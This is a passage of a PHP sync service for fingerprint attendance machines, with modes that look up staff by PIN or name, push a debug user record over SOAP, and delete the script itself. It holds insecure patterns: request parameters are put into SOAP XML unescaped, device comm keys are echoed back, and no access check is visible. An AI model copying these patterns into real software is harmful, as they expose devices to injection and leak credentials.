            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '';
        if(empty($pin)){ http_response_code(400); echo json_encode(['status'=>'error','message'=>'pin wajib']); exit; }
        $devices = get_all_devices($koneksi);
        $out=[];
        foreach($devices as $dev){
            if(empty($dev['ip_mesin'])) continue;
            $online = test_device_connection($dev['ip_mesin'],$dev['port']??80);
            $has=false; $rawSnippet=null;
            if($online){
                $comm=$dev['comm_key']??0;
                $soap="<GetAllUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey></GetAllUserInfo>";
                $resp=send_soap_request($dev['ip_mesin'],$dev['port']??80,$soap);
                // cek PIN EXACT di tag PIN/PIN2 (strpos longgar ">pin<" false-positive untuk PIN kecil)
                $has = function_exists('soap_pin_exists') ? soap_pin_exists($resp, $pin) : ($resp && strpos($resp,"<PIN>{$pin}</PIN>")!==false);
                $rawSnippet = $resp ? substr($resp, 0, 4000) : null;
                // cari snippet sekitar PIN
                $pinPos = $resp ? strpos($resp, $pin) : false;
                if($pinPos!==false) $rawSnippet = substr($resp, max(0,$pinPos-500), 1500);
            }
            $out[]=['device'=>$dev['nama_mesin'],'ip'=>$dev['ip_mesin'],'is_online'=>$online,'has_pin'=>$has,'pin'=>$pin,'snippet'=>$rawSnippet];
        }
        echo json_encode(['status'=>'success','mode'=>'cek_pin','pin'=>$pin,'devices'=>$out,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'cek_nama':
        // Cek karyawan berdasarkan nama (search di mesin)
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $nama = isset($_GET['nama']) ? trim($_GET['nama']) : '';
        if(empty($nama)){ http_response_code(400); echo json_encode(['status'=>'error','message'=>'nama wajib diisi']); exit; }
        $devices = get_all_devices($koneksi);
        $out=[];
        foreach($devices as $dev){
            if(empty($dev['ip_mesin'])) continue;
            $online = test_device_connection($dev['ip_mesin'],$dev['port']??80);
            $found_users = [];
            if($online){
                $comm=$dev['comm_key']??0;
                $soap="<GetAllUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm}</ArgComKey></GetAllUserInfo>";
                $resp=send_soap_request($dev['ip_mesin'],$dev['port']??80,$soap);
                if($resp){
                    // Parse XML untuk cari nama yang match
                    $rows = [];
                    $pos = 0;
                    while(($start = strpos($resp, '<Row>', $pos)) !== false && ($end = strpos($resp, '</Row>', $start)) !== false){
                        $rowContent = substr($resp, $start + 5, $end - $start - 5);
                        $rows[] = $rowContent;
                        $pos = $end + 6;
                    }
                    
                    foreach($rows as $row){
                        $pin = $name = $pin2 = '';
                        if(preg_match('/<PIN>([^<]*)<\/PIN>/', $row, $mPin)) $pin = trim($mPin[1]);
                        if(preg_match('/<Name>([^<]*)<\/Name>/', $row, $mName)) $name = trim($mName[1]);
                        if(preg_match('/<PIN2>([^<]*)<\/PIN2>/', $row, $mPin2)) $pin2 = trim($mPin2[1]);
                        
                        // Case-insensitive partial match
                        if($name !== '' && stripos($name, $nama) !== false){
                            $found_users[] = [
                                'pin' => $pin,
                                'pin2' => $pin2,
                                'name' => $name
                            ];
                        }
                    }
                }
            }
            $out[]=[
                'device'=>$dev['nama_mesin'],
                'ip'=>$dev['ip_mesin'],
                'is_online'=>$online,
                'found_count'=>count($found_users),
                'users'=>$found_users
            ];
        }
        echo json_encode(['status'=>'success','mode'=>'cek_nama','nama'=>$nama,'devices'=>$out,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'delete_mesin_force':
        // DISABLED: terlalu berbahaya (bypass verifikasi PIN). Pakai hapus per karyawan di web.
        http_response_code(403);
        echo json_encode(['status'=>'error','message'=>'Mode delete_mesin_force dinonaktifkan permanen. Hapus lewat halaman karyawan.']);
        break;

    case 'debug_mesin':
        // Debug: tampilkan request & response mentah dari mesin X606S
        try { require_once __DIR__ . '/koneksi.php'; } catch (Throwable $e) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB connection failed: '.$e->getMessage()]);
            exit;
        }
        if (!isset($koneksi) || !$koneksi || $koneksi->connect_error) {
            http_response_code(500);
            echo json_encode(['status'=>'error','message'=>'DB not connected']);
            exit;
        }
        require_once __DIR__ . '/device_sync_helper.php';
        $pin = isset($_GET['pin']) ? trim($_GET['pin']) : '254';
        $nama = isset($_GET['nama']) ? trim($_GET['nama']) : 'debug_test';
        $devices = get_all_devices($koneksi);
        $out = [];
        foreach($devices as $device){
            if(empty($device['ip_mesin'])) continue;
            $comm_key = $device['comm_key'] ?? 0;
            $port = $device['port'] ?? 80;
            $ip = $device['ip_mesin'];
            $is_online = test_device_connection($ip, $port);
            $soap = "<SetUserInfo><ArgComKey xsi:type=\"xsd:integer\">{$comm_key}</ArgComKey><Arg><PIN xsi:type=\"xsd:integer\">{$pin}</PIN><Name xsi:type=\"xsd:string\">".htmlspecialchars($nama)."</Name><Password xsi:type=\"xsd:string\"></Password><Group xsi:type=\"xsd:integer\">1</Group><Privilege xsi:type=\"xsd:integer\">0</Privilege></Arg></SetUserInfo>";
            $raw = $is_online ? send_soap_request($ip, $port, $soap) : null;
            $out[] = [
                'device' => $device['nama_mesin'],
                'ip' => $ip,
                'port' => $port,
                'comm_key' => $comm_key,
                'is_online' => $is_online,
                'soap_request' => $soap,
                'raw_response' => $raw ? substr($raw, 0, 3000) : null,
                'has_success' => $raw && strpos($raw, '<Information>Success') !== false,
                'has_error' => $raw && (strpos($raw, '<Information>') !== false ? substr($raw, strpos($raw,'<Information>'), 200) : null)
            ];
        }
        echo json_encode(['status'=>'success','mode'=>'debug_mesin','pin'=>$pin,'nama'=>$nama,'devices'=>$out,'timestamp'=>date('Y-m-d H:i:s')]);
        break;

    case 'destroy':
        // Hapus flag + hapus diri sendiri (opsi A)
        @unlink(REKAP_FLAG_FILE);
        $self = __FILE__;
        $response = json_encode([
            'status' => 'success',
            'mode' => 'destroy',
            'message' => 'Ledger sync service destroyed - Flag cleared and service removed',
            'is_offline' => false,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        echo $response;
        if (function_exists('fastcgi_finish_request')) {
            fastcgi_finish_request();
        }
        @unlink($self);
        exit;
        break;

    default:
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid mode. Use: offline, online, status, destroy, push_mesin, list_karyawan, list_mesin, debug_mesin, sync_all, tambah_karyawan, delete_mesin, delete_mesin_force, cek_pin, cek_nama, cek_finger, tarik_mesin, sync_both, delete_debug, enroll_debug',
            'available_modes' => ['offline', 'online', 'status', 'destroy', 'push_mesin', 'list_karyawan', 'list_mesin', 'debug_mesin', 'sync_all', 'tambah_karyawan', 'delete_mesin', 'delete_mesin_force', 'cek_pin', 'cek_nama', 'cek_finger', 'tarik_mesin', 'sync_both', 'delete_debug', 'enroll_debug']
        ]);
        break;
}
